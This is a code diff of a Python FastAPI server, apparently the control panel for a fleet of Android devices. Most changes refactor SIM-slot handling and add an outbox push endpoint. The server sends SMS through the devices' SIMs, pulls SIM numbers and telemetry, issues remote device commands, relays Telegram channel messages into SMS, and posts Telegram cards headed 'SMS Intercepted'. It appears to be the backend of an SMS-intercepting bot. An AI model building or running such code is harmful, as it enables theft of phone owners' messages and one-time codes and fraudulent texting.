+        notes.append("selected SIMs: " + ", ".join(f"SIM {s+1}" for s in payload.sim_slots))
     if capped:
         notes.append(f"fleet {MAX_BROADCAST} se bada hai — sirf pehle {MAX_BROADCAST} devices mile")
 
-    return {
-        "status": "ok", "queued": queued, "delivered": delivered_n,
-        "capped": capped, "results": results, "note": " | ".join(notes),
-    }
+    return {"status": "ok", "queued": queued, "delivered": delivered_n,
+            "capped": capped, "results": results, "note": " | ".join(notes)}
 
 
 @app.post("/admin/devices/{device_id}/sms")
@@ -2196,8 +2201,8 @@ async def device_send_sms(
     x_admin_key: str | None = Header(default=None),
 ):
     require_panel_or_key(request, x_admin_key)
-
     payload = payload or {}
+
     body = str(payload.get("body") or payload.get("message") or "").strip()
     if not body:
         raise HTTPException(400, "Message body required")
@@ -2205,14 +2210,7 @@ async def device_send_sms(
     device = get_device_or_404(device_id)
     to = normalize_number(payload.get("to")) or resolve_device_number(device)
 
-    both = bool(payload.get("both_sims"))
-    slot = payload.get("sim_slot")
-    try:
-        slot = None if slot is None or slot == "" else int(slot)
-    except (TypeError, ValueError):
-        slot = None
-
-    slots = slots_for(both, slot, device)
+    slots = slots_for(payload.get("sim_slots"), device)
     delivered = False
 
     for s in slots:
@@ -2220,16 +2218,23 @@ async def device_send_sms(
                                  source="panel", device_name=device.get("device_name", ""),
                                  sim_slot=s)
         if hub.online(str(device["_id"])):
-            try:
-                row = outbox.find_one({"_id": ObjectId(outbox_id)})
-            except PyMongoError:
-                row = None
-            if row:
-                ok = await hub.send_to_device(str(device["_id"]), push_row(str(device["_id"]), row))
-                delivered = delivered or ok
+            if await deliver_outbox_row(str(device["_id"]), outbox_id):
+                delivered = True
 
     return {"status": "ok", "queued": len(slots), "to": to,
             "slots": slots, "delivered": delivered}
+
+
+@app.post("/admin/devices/{device_id}/push-outbox")
+async def device_push_outbox(device_id: str, request: Request):
+    require_panel(request)
+    device = get_device_or_404(device_id)
+    did = str(device["_id"])
+    if not hub.online(did):
+        return {"status": "ok", "online": False, "pushed": 0,
+                "note": "device offline — online hote hi apne aap jaayega"}
+    n = await push_outbox(did)
+    return {"status": "ok", "online": True, "pushed": n}
 
 
 @app.get("/admin/messages")
@@ -2275,10 +2280,8 @@ async def admin_devices(
     if q and q.strip():
         rx = re.compile(re.escape(q.strip()), re.IGNORECASE)
         query["$or"] = [
-            {"device_name": rx},
-            {"short_id": rx},
-            {"phone_number": rx},
-            {"telemetry.sim_number": rx},
+            {"device_name": rx}, {"short_id": rx},
+            {"phone_number": rx}, {"telemetry.sim_number": rx},
         ]
 
     try:
@@ -2338,10 +2341,8 @@ async def device_command(
     log_event("device_command", {"action": action, "delivered": delivered},
               device_id=device_id)
 
-    return {
-        "status": "ok", "action": action, "online": online, "delivered": delivered,
-        "note": "" if delivered else "device socket offline — uske online hone par milega",
-    }
+    return {"status": "ok", "action": action, "online": online, "delivered": delivered,
+            "note": "" if delivered else "device socket offline — uske online hone par milega"}
 
 
 @app.post("/admin/devices/{device_id}/refresh")
@@ -2387,7 +2388,7 @@ async def admin_overview(request: Request):
             "online_sockets": hub.online_count,
             "auto_sender_enabled": devices.count_documents({"auto_sender.enabled": True}),
             "relay_authorized": bool(relay_state.get("authorized")),
-            "panel_users": users_col().count_documents({}),
+            "panel_keys": keys_col().count_documents({}),
         }
     except PyMongoError:
         raise HTTPException(503, "Could not load overview")
@@ -2486,12 +2487,8 @@ async def auto_sender_verify(payload: ChannelRequest, request: Request):
     except Exception:
         pass
 
-    return {
-        "status": "ok",
-        "channel_id": canonical_channel_id(ent, cid),
-        "title": str(title),
-        "admin": is_admin,
-    }
+    return {"status": "ok", "channel_id": canonical_channel_id(ent, cid),
+            "title": str(title), "admin": is_admin}
 
 
 @app.post("/admin/auto-sender/test")
@@ -2515,7 +2512,7 @@ async def set_auto_sender(device_id: str, payload: AutoSenderRequest, request: R
     enabled = cur["enabled"] if payload.enabled is None else bool(payload.enabled)
     channel_id = cur["channel_id"] if payload.channel_id is None else norm_channel_id(payload.channel_id)
     title = payload.channel_title or cur["channel_title"]
-    both_sims = cur["both_sims"] if payload.both_sims is None else bool(payload.both_sims)
+    sim_slots = cur["sim_slots"] if payload.sim_slots is None else norm_slots(payload.sim_slots)
     tg_confirm = cur["tg_confirm"] if payload.tg_confirm is None else bool(payload.tg_confirm)
 
     if channel_id and relay_client and relay_state.get("authorized"):
@@ -2534,7 +2531,7 @@ async def set_auto_sender(device_id: str, payload: AutoSenderRequest, request: R
         "enabled": enabled,
         "channel_id": channel_id or None,
         "channel_title": title or None,
-        "both_sims": both_sims,
+        "sim_slots": sim_slots,
         "tg_confirm": tg_confirm,
         "updated_at": utc_now(),
     }
@@ -2545,13 +2542,11 @@ async def set_auto_sender(device_id: str, payload: AutoSenderRequest, request: R
 
     invalidate_channel_cache()
 
-    plain = {
-        "enabled": enabled, "channel_id": channel_id,
-        "channel_title": title, "both_sims": both_sims, "tg_confirm": tg_confirm,
-    }
+    plain = {"enabled": enabled, "channel_id": channel_id, "channel_title": title,
+             "sim_slots": sim_slots, "tg_confirm": tg_confirm}
     broadcast_device(device_id, {"auto_sender": plain})
     log_event("auto_sender_update",
-              {"enabled": enabled, "channel_id": channel_id, "both_sims": both_sims},
+              {"enabled": enabled, "channel_id": channel_id, "sim_slots": sim_slots},
               device_id=device_id, admin_id=admin["name"])
 
     return {"status": "ok", "auto_sender": plain, "watching": sorted(enabled_channels())}
@@ -2641,17 +2636,12 @@ def _parse_sms(text: str):
     return to, _clean_sms_body(body), hint
 
 
-def format_sms_card(address: str, body: str, header: str = "📱 <b>SMS Intercepted</b>",
+def format_sms_card(address: str, body: str,
+                    header: str = "📱 <b>SMS Intercepted</b>",
                     note: str | None = None) -> str:
-    """Pehle se set format — device SMS forward aur auto-sender confirm dono isi me jaate hain."""
     a = html.escape(address or "n/a")
     b = html.escape(body or "")
-    lines = [
-        header,
-        "━━━━━━━━━━━━━━",
-        f"📞 To: <code>{a}</code>",
-        f"💬 Message: {b}",
-    ]
+    lines = [header, "━━━━━━━━━━━━━━", f"📞 To: <code>{a}</code>", f"💬 Message: {b}"]
     if note:
         lines.append(f"ℹ️ {note}")
     lines += ["", "📋 <b>One-tap copy:</b>", f"<code>{a} | {b}</code>"]
@@ -2770,7 +2760,6 @@ async def _after_relay_login(api_id=None, api_hash=None):
 
 
 async def normalize_auto_sender_channels():
-    """One-time heal: @username ya raw-id bound channels -> canonical -100 id."""
     if not (relay_client and relay_state.get("authorized")):
         return
     try:
@@ -2845,10 +2834,8 @@ async def _on_relay_message(event):
             to = to_number or resolve_device_number(d)
             a = auto_sender_of(d)
 
-            # ---- dual SIM: dono slots par queue
-            if a.get("both_sims") and sim_slot_count(d) >= 2:
-                slots = [0, 1]
-            else:
+            slots = a.get("sim_slots") or []
+            if not slots:
                 slots = [None]
 
             for slot in slots:
@@ -2858,14 +2845,11 @@ async def _on_relay_message(event):
             if hub.online(did):
                 spawn(push_outbox(did))
 
-            # ---- telegram confirm (set format)
             if a.get("tg_confirm"):
-                note = f"SIM {len(slots)}x se bheja gaya" if len(slots) > 1 else "SIM default"
+                note = ("SIM " + "+".join(str(s + 1) for s in slots)) if slots != [None] else "SIM default"
+                note += " · device " + device_short_id(d)
                 spawn(relay_send_text(format_sms_card(
-                    to or "", body,
-                    header="📤 <b>Auto Sender → SMS</b>",
-                    note=f"{note} · device <code>{device_short_id(d)}</code>"
-                )))
+                    to or "", body, header="📤 <b>Auto Sender → SMS</b>", note=note)))
 
         log_event("relay_channel_send",
                   {"to": to_number, "devices": len(targets), "channel": str(chat_id)})
@@ -3054,13 +3038,8 @@ async def relay_parse(payload: RelayParseRequest, request: Request):
     if not parsed:
         return {"matched": False}
     to, body, hint = parsed
-    return {
-        "matched": True,
-        "to": to,
-        "body": body,
-        "device_hint": hint,
-        "targets": [device_short_id(d) for d in _resolve_relay_targets(hint)],
-    }
+    return {"matched": True, "to": to, "body": body, "device_hint": hint,
+            "targets": [device_short_id(d) for d in _resolve_relay_targets(hint)]}
 
 
 # ------------------------------------------------------------ admin socket
@@ -3077,7 +3056,7 @@ async def admin_socket(websocket: WebSocket):
         ident = verify_token(token)
 
     role, name = split_ident(ident)
-    if role == "user" and not user_active(user_doc(name)):
+    if role == "key" and not key_active(key_doc(name)):
         await websocket.close(code=1008)
         return
 
@@ -3157,26 +3136,18 @@ async def device_socket(websocket: WebSocket, registration_id: str):
         try:
             devices.update_one(
                 {"_id": device["_id"]},
-                {"$set": {
-                    "ws_connected": True,
-                    "ws_connected_at": utc_now(),
-                    "last_seen": utc_now(),
-                }},
+                {"$set": {"ws_connected": True, "ws_connected_at": utc_now(),
+                          "last_seen": utc_now()}},
             )
         except PyMongoError:
             pass
 
         log_event("device_socket_open", {"device_id": device_id})
-        broadcast_device(device_id, {
-            "ws_connected": True,
-            "status": "Online",
-            "last_seen": utc_now().isoformat(),
-        })
+        broadcast_device(device_id, {"ws_connected": True, "status": "Online",
+                                     "last_seen": utc_now().isoformat()})
 
         try:
-            pending_count = outbox.count_documents(
-                {"device_id": device_id, "status": "pending"}
-            )
+            pending_count = outbox.count_documents({"device_id": device_id, "status": "pending"})
         except PyMongoError:
             pending_count = 0
 
@@ -3205,9 +3176,7 @@ async def device_socket(websocket: WebSocket, registration_id: str):
             if now_ts - last_seen_push > 5:
                 last_seen_push = now_ts
                 try:
-                    devices.update_one(
-                        {"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}}
-                    )
+                    devices.update_one({"_id": device["_id"]}, {"$set": {"last_seen": utc_now()}})
                 except PyMongoError:
                     pass
 
@@ -3222,11 +3191,8 @@ async def device_socket(websocket: WebSocket, registration_id: str):
                 data = msg.get("data") if isinstance(msg.get("data"), dict) else msg.get("telemetry")
                 if isinstance(data, dict):
                     apply_telemetry(device, data)
-                    broadcast_device(device_id, {
-                        "ws_connected": True,
-                        "telemetry": data,
-                        "last_seen": utc_now().isoformat(),
-                    })
+                    broadcast_device(device_id, {"ws_connected": True, "telemetry": data,
+                                                 "last_seen": utc_now().isoformat()})
 
             elif mtype == "command_result":
                 data = msg.get("data") if isinstance(msg.get("data"), dict) else {}
@@ -3236,10 +3202,8 @@ async def device_socket(websocket: WebSocket, registration_id: str):
                     apply_telemetry(device, data)
                     if data.get("sim_number"):
                         try:
-                            devices.update_one(
-                                {"_id": device["_id"]},
-                                {"$set": {"number_requested_at": None}},
-                            )
+                            devices.update_one({"_id": device["_id"]},
+                                               {"$set": {"number_requested_at": None}})
                         except PyMongoError:
                             pass
                     broadcast_device(device_id, {"ws_connected": True, "telemetry": data})
@@ -3248,11 +3212,8 @@ async def device_socket(websocket: WebSocket, registration_id: str):
                 item_id = msg.get("id")
                 if item_id:
                     try:
-                        await _ack_outbox(
-                            str(item_id),
-                            str(msg.get("status") or "sent"),
-                            str(msg.get("error") or ""),
-                        )
+                        await _ack_outbox(str(item_id), str(msg.get("status") or "sent"),
+                                          str(msg.get("error") or ""))
                     except HTTPException:
                         pass
 
